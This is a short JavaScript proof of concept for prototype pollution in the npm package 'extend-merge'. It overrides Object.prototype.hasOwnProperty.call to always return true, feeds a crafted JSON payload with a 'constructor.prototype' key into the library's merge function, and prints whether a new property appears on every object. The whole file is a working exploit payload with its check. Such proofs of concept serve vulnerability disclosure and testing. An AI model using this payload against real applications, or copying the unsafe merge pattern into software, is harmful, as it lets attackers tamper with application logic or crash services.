Object.prototype.hasOwnProperty.call = () => true;
const extend_merge = require('extend-merge');
const payload = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
let obj = {};
console.log({}.polluted);
extend_merge.merge({}, payload);
console.log({}.polluted);